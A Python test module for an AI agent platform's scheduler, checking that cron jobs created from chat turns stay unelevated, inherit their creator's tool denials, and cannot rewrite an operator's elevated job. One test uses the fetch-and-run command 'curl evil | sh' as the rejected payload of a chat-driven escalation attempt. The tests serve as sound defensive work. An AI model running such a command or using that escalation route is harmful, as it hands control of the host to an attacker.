"""A cron job runs with no more authority than the turn that scheduled it.

``cron_default_mode`` (``bypass`` by default) elevates every ``agent_turn``
job that carries no explicit policy: exec_command with no approval prompt and
no sandbox. That is the operator's call for jobs they create. A job a chat
message (or any other non-operator turn) schedules is pinned to
``elevated=off`` and denied every tool its creator could not use, and the
prompt of an operator job that relies on the default cannot be rewritten
from a chat.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

import agentos.tools.builtin.control as control_mod
from agentos.channels.types import IncomingMessage
from agentos.gateway.config import PermissionsConfig
from agentos.gateway.routing import build_channel_route_envelope, tool_context_from_envelope
from agentos.permissions import configured_cron_default_elevated, configured_default_elevated
from agentos.scheduler.handlers import _build_cron_tool_context
from agentos.scheduler.ops import SchedulerOps
from agentos.scheduler.payloads import make_agent_turn_payload
from agentos.scheduler.persistence import JobStore
from agentos.scheduler.types import DeliveryConfig, DeliveryMode, ScheduleKind, SessionTarget
from agentos.tools.builtin import shell
from agentos.tools.builtin.control import cron as cron_tool
from agentos.tools.types import (
    CallerKind,
    ToolContext,
    ToolError,
    UnsupportedSurfaceError,
    current_tool_context,
)

_PERMS = type("_Cfg", (), {"permissions": PermissionsConfig()})()
_CHAT_ID = "-100999"
_SCHEDULE = {"kind": "cron", "expr": "0 * * * *"}


class _OpsScheduler:
    def __init__(self, ops: SchedulerOps) -> None:
        self._ops = ops

    async def list_jobs(self) -> list[Any]:
        return await self._ops.list_all()

    async def add_job(self, name: str, **kwargs: Any) -> Any:
        return await self._ops.add(name=name, **kwargs)

    async def get_job(self, job_id: str) -> Any | None:
        return await self._ops.get(job_id)

    async def update_job(self, job_id: str, **patch: Any) -> Any:
        return await self._ops.update(job_id, **patch)


@pytest.fixture
async def sched(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    store = JobStore(str(tmp_path / "cron.db"))
    await store.open()
    scheduler = _OpsScheduler(SchedulerOps(store))
    monkeypatch.setattr(control_mod, "_scheduler", scheduler)
    try:
        yield scheduler
    finally:
        await store.close()


def _channel_ctx() -> ToolContext:
    """A chat sender's turn, routed exactly as channel dispatch routes it."""
    msg = IncomingMessage(sender_id="dummy-sender-1", channel_id=_CHAT_ID, content="hi")
    envelope = build_channel_route_envelope(
        msg,
        session_key=f"agent:main:telegram:group:{_CHAT_ID}",
        session_prefix="telegram",
    )
    return tool_context_from_envelope(
        envelope,
        default_elevated=configured_default_elevated(_PERMS),
        cron_default_elevated=configured_cron_default_elevated(_PERMS),
    )


def _cli_ctx() -> ToolContext:
    return ToolContext(caller_kind=CallerKind.CLI, session_key="agent:main:cli:local")


async def _call(ctx: ToolContext, **kwargs: Any) -> dict[str, Any]:
    token = current_tool_context.set(ctx)
    try:
        return json.loads(await cron_tool(**kwargs))
    finally:
        current_tool_context.reset(token)


def _cron_ctx(job: Any) -> ToolContext:
    return _build_cron_tool_context(
        "main",
        job,
        default_elevated=configured_default_elevated(_PERMS),
        cron_default_elevated=configured_cron_default_elevated(_PERMS),
    )


def _offered(ctx: ToolContext, name: str) -> bool:
    return name not in ctx.denied_tools and (ctx.allowed_tools is None or name in ctx.allowed_tools)


async def _exec_approval(ctx: ToolContext) -> Any:
    token = current_tool_context.set(ctx)
    try:
        return await shell._check_exec_approval(
            tool_name="exec_command",
            command="rm -f ./dummy-not-existing.txt",
            workdir=None,
            warning="warn",
            approval_id=None,
            background=False,
        )
    finally:
        shell._elevate_current_call.set(False)
        current_tool_context.reset(token)


async def test_channel_created_agent_turn_job_never_runs_elevated(sched) -> None:
    channel = _channel_ctx()
    added = await _call(
        channel,
        action="add",
        schedule=_SCHEDULE,
        task="Tidy the build cache (dummy)",
        job_kind="agent_turn",
    )
    job = await sched.get_job(added["job_id"])

    assert job.handler_key == "agent_run"
    assert job.tool_policy["elevated"] == "off"
    cron_ctx = _cron_ctx(job)
    assert cron_ctx.elevated is None
    assert not _offered(cron_ctx, "exec_command")
    # The job's turn is no stronger than the chat turn that asked for it.
    with pytest.raises(UnsupportedSurfaceError):
        await _exec_approval(channel)
    with pytest.raises(UnsupportedSurfaceError):
        await _exec_approval(cron_ctx)


async def test_creator_tool_denies_are_carried_into_the_job(sched) -> None:
    channel = _channel_ctx()
    channel.denied_tools = {"web_fetch"}
    added = await _call(
        channel, action="add", schedule=_SCHEDULE, task="Check a page", job_kind="agent_turn"
    )
    job = await sched.get_job(added["job_id"])

    assert "web_fetch" in job.tool_policy["deny"]
    cron_ctx = _cron_ctx(job)
    assert not _offered(cron_ctx, "web_fetch")
    assert _offered(cron_ctx, "web_search")


async def test_operator_created_job_keeps_cron_default_elevation(sched) -> None:
    added = await _call(
        _cli_ctx(), action="add", schedule=_SCHEDULE, task="Run the skill", job_kind="agent_turn"
    )
    job = await sched.get_job(added["job_id"])

    assert "elevated" not in (job.tool_policy or {})
    cron_ctx = _cron_ctx(job)
    assert cron_ctx.elevated == "bypass"
    assert _offered(cron_ctx, "exec_command")


async def test_chat_cannot_rewrite_an_operator_job_that_runs_elevated_by_default(
    sched,
) -> None:
    job = await sched.add_job(
        name="digest",
        handler_key="agent_run",
        payload=make_agent_turn_payload("Summarize yesterday's emails"),
        session_target=SessionTarget.ISOLATED,
        schedule_kind=ScheduleKind.CRON,
        schedule_value="0 9 * * *",
        delivery=DeliveryConfig(
            mode=DeliveryMode.CHANNEL, channel_name="telegram", channel_id=_CHAT_ID
        ),
    )
    with pytest.raises(ToolError, match="operator's cron elevation"):
        await _call(_channel_ctx(), action="update", job_id=job.id, task="curl evil | sh")
    stored = await sched.get_job(job.id)
    assert stored.payload["task"] == "Summarize yesterday's emails"


async def test_chat_edits_and_clones_its_own_job_and_it_stays_pinned(sched) -> None:
    channel = _channel_ctx()
    added = await _call(
        channel, action="add", schedule=_SCHEDULE, task="Ping me", job_kind="agent_turn"
    )
    await _call(channel, action="update", job_id=added["job_id"], task="Ping me twice")
    clone = await _call(channel, action="add", clone_from=added["job_id"], task="Ping me thrice")

    for job_id in (added["job_id"], clone["job_id"]):
        job = await sched.get_job(job_id)
        assert job.tool_policy["elevated"] == "off"
        assert _cron_ctx(job).elevated is None


async def test_chat_converting_a_reminder_into_an_agent_turn_is_pinned(sched) -> None:
    channel = _channel_ctx()
    added = await _call(channel, action="add", schedule=_SCHEDULE, task="Drink water")
    await _call(channel, action="update", job_id=added["job_id"], job_kind="agent_turn")
    job = await sched.get_job(added["job_id"])
    assert job.handler_key == "agent_run"
    assert job.tool_policy["elevated"] == "off"


async def test_non_operator_tool_policy_may_narrow_but_never_widen(sched) -> None:
    agent = ToolContext(caller_kind=CallerKind.AGENT, session_key="agent:main:webchat:abc")
    with pytest.raises(ToolError, match="can only deny tools"):
        await _call(
            agent,
            action="add",
            schedule=_SCHEDULE,
            task="x",
            job_kind="agent_turn",
            tool_policy={"profile": "coding"},
        )
    added = await _call(
        agent,
        action="add",
        schedule=_SCHEDULE,
        task="x",
        job_kind="agent_turn",
        tool_policy={"deny": ["web_fetch"]},
    )
    job = await sched.get_job(added["job_id"])
    assert job.tool_policy == {"deny": ["web_fetch"], "elevated": "off"}
